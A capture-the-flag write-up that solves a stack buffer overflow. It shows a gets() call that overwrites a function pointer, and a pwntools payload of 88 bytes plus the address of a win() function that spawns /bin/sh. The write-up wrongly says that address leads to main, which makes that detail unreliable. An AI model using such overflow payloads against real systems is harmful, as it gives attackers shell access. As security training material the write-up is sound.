# Chall_04

## Solution

First we run a checksec on the file and see there is no canary and no PIE.

Next we open the program in radare.

```assembly 
23: sym.win ();                                                                                                    
│           0x00401176      f30f1efa       endbr64                                                                   │           0x0040117a      55             push rbp                                                                  
│           0x0040117b      4889e5         mov rbp, rsp                                                              │           0x0040117e      488d3d830e00.  lea rdi, str._bin_sh        ; 0x402008 ; "/bin/sh"                        
│           0x00401185      e8e6feffff     call sym.imp.system         ;[1] ; int system(const char *string)         
│           0x0040118a      90             nop                                                                       
│           0x0040118b      5d             pop rbp                                                                   
└           0x0040118c      c3             ret                                                                       
            ; CALL XREF from main @ 0x4011cc                                                                         
┌ 38: sym.vuln ();                                                                                                   
│           ; var int64_t var_60h @ rbp-0x60                                                                         
│           ; var int64_t var_8h @ rbp-0x8                                                                           
│           0x0040118d      f30f1efa       endbr64                                                                   
│           0x00401191      55             push rbp                                                                  
│           0x00401192      4889e5         mov rbp, rsp                                                              
│           0x00401195      4883ec60       sub rsp, 0x60                                                             
│           0x00401199      488d45a0       lea rax, [var_60h]                                                        
│           0x0040119d      4889c7         mov rdi, rax                                                              
│           0x004011a0      b800000000     mov eax, 0                                                                
│           0x004011a5      e8d6feffff     call sym.imp.gets           ;[2] ; char *gets(char *s)                    
│           0x004011aa      488b45f8       mov rax, qword [var_8h]                                                   
│           0x004011ae      ffd0           call rax                                                                  
│           0x004011b0      90             nop                                                                       
│           0x004011b1      c9             leave                                                                     
└           0x004011b2      c3             ret                                                                       
            ; DATA XREF from entry0 @ 0x4010b1                                                                       
┌ 37: int main (int argc, char **argv, char **envp);                                                                 
│           0x004011b3      f30f1efa       endbr64                                                                   
│           0x004011b7      55             push rbp                                                                  
│           0x004011b8      4889e5         mov rbp, rsp                                                              
│           0x004011bb      488d3d4e0e00.  lea rdi, str.Follow_the_compass_and_itll_point_you_in_the_right_direction
│           0x004011c2      e899feffff     call sym.imp.puts           ;[3] ; int puts(const char *s)                
│           0x004011c7      b800000000     mov eax, 0                                                                
│           0x004011cc      e8bcffffff     call sym.vuln               ;[4]                                          
│           0x004011d1      b800000000     mov eax, 0                                                                
│           0x004011d6      5d             pop rbp                                                                   
└           0x004011d7      c3             ret                                                                       
            0x004011d8      0f1f84000000.  nop dword [rax + rax]                                                     
            ; DATA XREF from entry0 @ 0x4010aa                       
 ```
Here we see the space we need to fill come from the two variable ```0x60-0x8=88```

So we run ```ipython``` and we import pwn and send the payload of ```p.sendline(b'A' * 88 + p64(0x00401176))``` with ```0x00401176``` being the address that takes us to main. 
